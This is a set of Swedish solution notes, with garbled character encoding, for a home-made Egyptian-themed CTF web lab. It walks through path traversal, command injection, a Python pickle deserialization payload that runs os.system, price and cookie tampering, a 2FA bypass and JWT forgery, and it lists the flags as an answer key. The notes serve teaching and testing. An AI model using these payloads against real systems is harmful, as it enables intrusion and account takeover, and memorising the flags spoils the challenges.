 Sammanfattning av stegen pÃ¥ path traversal
Testa nu sÃ¥ hÃ¤r:

1ï¸âƒ£ ls â†’ Ser att flags/ finns
2ï¸âƒ£ ls flags â†’ Ser att sacred_command.txt finns
3ï¸âƒ£ cat flags/sacred_command.txt

--------------------------------------------------
Sammanfattning av stgen pÃ¥ OS command injection

Lista root-katalogen fÃ¶r att hitta /flags/ â†’ ls /
Lista /flags/ fÃ¶r att se om flaggfiler finns â†’ ls /flags
LÃ¤s flaggfilen med cat â†’ cat /flags/sacred_command.txt

 Nu Ã¤r labben komplett och lÃ¤tt att fÃ¶rstÃ¥!

------------------------------------------------------
Sammanfattning av steg pÃ¥  Insecure Deserialization

BesÃ¶k sidan pÃ¥ http://localhost:5000/canopic_jar.
Skapa en payload i Python med pickle och base64.
Skicka payloaden via inputfÃ¤ltet pÃ¥ webbsidan.
Servern deserialiserar datan och kÃ¶r kommandot.
Flaggan visas! 
--------------------------------------------------------
payloaden : 
import pickle
import base64
import os

# Skapa en exploitklass
class Exploit:
    def __reduce__(self):
        return (os.system, ("cat /flags/soul_of_osiris.txt",))

# Serialisera objektet
exploit = pickle.dumps(Exploit())

# Konvertera till Base64 fÃ¶r att skicka via webben
payload = base64.b64encode(exploit).decode()
print(payload)

Eller curl -X GET http://172.18.0.2:5000/canopic_jar
----------------------------------------------------------
Sammanfattning client side exploit

Webbplatsen litar pÃ¥ klientens inmatning (ingen servervalidering).
Vi Ã¤ndrar priset till ett negativt vÃ¤rde â†’ Flaggan ges som belÃ¶ning!
Exploit fungerar via bÃ¥de DevTools och en POST-request.

Metod 1: Manipulera HTML i webbinspektÃ¶ren

    Ã–ppna DevTools (HÃ¶gerklicka â†’ "Inspektera element" eller F12).
    Leta upp HTML-koden fÃ¶r prisinputfÃ¤ltet:

<input type="text" id="price" name="price" value="100">

Ã„ndra vÃ¤rdet till ett negativt tal:

<input type="text" id="price" name="price" value="-1000">

Tryck pÃ¥ "Buy" och skicka formulÃ¤ret.
Om exploiten fungerar fÃ¥r du flaggan:

     You exploited the system! Flag: O24{market_of_hatshepsut_welcomes_the_shadow_trader}

Alternativ: Skicka en manipulerad request

Om du vill anvÃ¤nda Burp Suite eller cURL, gÃ¶r sÃ¥ hÃ¤r:
 Metod 2: cURL

Skicka en POST-request med negativt pris:

curl -X POST -d "price=-1000" http://localhost:5000/store/buy

FÃ¥r du flaggan i svaret? DÃ¥ har du klarat labben!

 Labben Ã¤r redo att anvÃ¤ndas i en CTF! Testa sjÃ¤lv och se om det funkar!

 ----------------------------------------------------------------------

 Sammanfattning av Broken Access Control

MÃ¥l: Bli admin genom att manipulera cookies.
Metod 1: Manipulera cookies i DevTools

Ã–ppna DevTools (F12) â†’ Fliken "Application".
Navigera till "Cookies" â†’ localhost.
Ã„ndra cookien role frÃ¥n user till admin.
Ladda om sidan /admin och fÃ¥ flaggan:

 You have accessed the sacred chamber! Flag: O24{duat_barriers_fall_as_the_false_pharaoh_rises}

Metod 2: Skicka en request via cURL

curl -X GET http://localhost:5000/admin --cookie "role=admin"

--------------------------------------------------------------

Sammanfattning av Infinite Money Exploit

MÃ¥l: FÃ¥ obegrÃ¤nsat med pengar genom att ange ett negativt belopp.
Metod 1: Manipulera fÃ¤ltet i DevTools

    Inspektera input-fÃ¤ltet och Ã¤ndra vÃ¤rdet till -1000.
    Skicka formulÃ¤ret och fÃ¥ flaggan!

    You exploited the banking system! Flag: O24{golden_sands_of_atum_create_wealth_without_end}

Metod 2: Skicka en request via cURL

curl -X POST -d "amount=-1000" http://localhost:5000/bank/transfer


Sammanfattning av stegen:

    Navigera till /temple_of_anubis och identifiera input-fÃ¤ltet.
    Testa whoami fÃ¶r att verifiera att kommandon kÃ¶rs.
    KÃ¶r ls -l flags/ fÃ¶r att se flaggfiler.
    LÃ¤s flaggan med cat flags/os_command_injection.txt.

ğŸ¯ Nu har du klarat utmaningen och fÃ¥tt din flagga! ğŸš€


            path traversal

âœ… Riktiga flaggan   ../../../../root/flags/true_flag.txt
âŒ Falsk flagga ancient_scroll.txt   ../flags/ancient_scroll.txt
âŒ Falsk flagga cursed_tablet.txt    ../flags/cursed_tablet.txt

------------------------------------------------------------------------------


Denna metod visar exakt hur man lÃ¶ser utmaningen med Burp Suite.
ğŸ”¥ Steg 1: Registrera en anvÃ¤ndare

1ï¸âƒ£ GÃ¥ till /register och skapa ett konto.
2ï¸âƒ£ Efter registrering skickas du vidare till /login.
ğŸ”¥ Steg 2: Logga in och fÃ¥ din 2FA-kod

1ï¸âƒ£ GÃ¥ till /login, logga in med dina uppgifter.
2ï¸âƒ£ Du skickas vidare till /verify_2fa dÃ¤r du fÃ¥r en 2FA-kod.
3ï¸âƒ£ Notera koden â€“ men du behÃ¶ver inte anvÃ¤nda den.
ğŸ”¥ Steg 3: Exploatera 2FA-buggen med Burp Suite

1ï¸âƒ£ Ã–ppna Burp Suite och aktivera Intercept Mode.
2ï¸âƒ£ GÃ¥ till /verify_2fa, fyll i formulÃ¤ret och skicka det.
3ï¸âƒ£ NÃ¤r Burp fÃ¥ngar requesten, Ã¤ndra request body till:

2fa=000000&verified=true

ğŸ“Œ Du kan skriva vad som helst i 2fa eller lÃ¤mna den tom â€“ det viktiga Ã¤r verified=true.
4ï¸âƒ£ FrigÃ¶r requesten och se vad som hÃ¤nder!
5ï¸âƒ£ Du blir inloggad och skickas till /game.
ğŸ”¥ Steg 4: LÃ¥s upp Pharaohâ€™s Vault och ta flaggan

1ï¸âƒ£ GÃ¥ till /game och fyll i rÃ¤tt lÃ¶senord:

ğ“‚€ğ“ğ“†£ğ“Šª

2ï¸âƒ£ I fÃ¤ltet fÃ¶r 2FA kan du skriva vad som helst eller lÃ¤mna det tomt.
3ï¸âƒ£ Klicka pÃ¥ "Unlock the Vault" och fÃ¥ flaggan!
ğŸ† Flagga

ğŸš€ NÃ¤r du exploaterat buggen och angett lÃ¶senordet korrekt fÃ¥r du:

O24{PHARAOHS_2FA_BROKEN}

ğŸ”¥ VarfÃ¶r fungerar detta?

    Applikationen litar pÃ¥ verified=true, vilket gÃ¶r att vi kan hoppa Ã¶ver 2FA-verifieringen.
    Vi kan skicka en tom 2FA-kod och Ã¤ndÃ¥ bli godkÃ¤nda.
    Flask anvÃ¤nder sessionshantering, vilket betyder att vi kan manipulera vÃ¥r autentisering i Burp.

--------------------------------------------------------------------------------------


document.cookie = "auth_token="TOKEN"; path=/";





Om du vill gÃ¶ra allt direkt frÃ¥n jwt.io istÃ¤llet fÃ¶r att anvÃ¤nda Python-skriptet, fÃ¶ljer du dessa steg:
ğŸ›  Steg fÃ¶r att manipulera JWT pÃ¥ jwt.io

    Ã–ppna jwt.io

    Klistra in din nuvarande JWT
        Till exempel:

    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJ1c2VyIiwgInJvbGUiOiAidXNlciIsICJleHAiOiAxNzQxOTYxOTYzfQ.p2egRol2RTzmjCgiAffOba1htqma-RfEJC0ZtZsQcE0

GÃ¥ till "Payload" (mellersta sektionen)

    Ã„ndra "role": "user" till

    "role": "admin"

Signaturen Ã¤r sÃ¥rbar, sÃ¥ vi byter ut den!

    Skrolla ner till "Verify Signature".
    Radera allt i "your-256-bit-secret" och skriv istÃ¤llet:

        MAYCAQACAQA=

        (Detta Ã¤r den magiska strÃ¤ngen som gÃ¶r att servern accepterar JWT:n.)

    Kopiera den nya JWT-tokenen
        Den ska nu ha rÃ¤tt "role": "admin", och signaturen ska vara MAYCAQACAQA=.

ğŸš€ Hur anvÃ¤nder du den nya JWT i webblÃ¤saren?

    Ã–ppna Developer Tools (F12) i Chrome/Firefox

    GÃ¥ till Console och skriv in:

document.cookie = "auth_token=DIN_NYA_JWT_HÃ„R; path=/";

    Byt ut DIN_NYA_JWT_HÃ„R mot den du fick frÃ¥n jwt.io.
    Exempel:

        document.cookie = "auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJ1c2VyIiwgInJvbGUiOiAiYWRtaW4iLCAiZXhwIjogMTc0MTk2MTk2M30.MAYCAQACAQA=; path=/";

    Tryck Enter och gÃ¥ sedan till /admin i webblÃ¤saren
        Om allt gick rÃ¤tt, ska du se flaggan! ğŸ†ğŸ‰

â— Vanliga problem och lÃ¶sningar

    "403 Forbidden" nÃ¤r jag gÃ¥r till /admin
        Kolla i Developer Tools â†’ Application â†’ Cookies om auth_token finns.
        Om JWT-tokenen Ã¤r fel, prova att generera en ny pÃ¥ jwt.io.

    "Invalid token - Signature verification failed"
        Dubbelkolla att signaturen Ã¤r MAYCAQACAQA=, inget annat.
        Se till att "role": "admin" finns i payloaden.

ğŸš€ Nu kan du gÃ¶ra allt direkt frÃ¥n jwt.io!

    BehÃ¶ver inte kÃ¶ra nÃ¥gra Python-skript.
    Direkt manipulation av JWT i webblÃ¤saren.
    Snabb och enkel flagg-exploatering! ğŸ”¥

Testa detta nu och se om du fÃ¥r flaggan! ğŸš€ğŸ†

-----------------------------------------------------------------------------------------------------------------------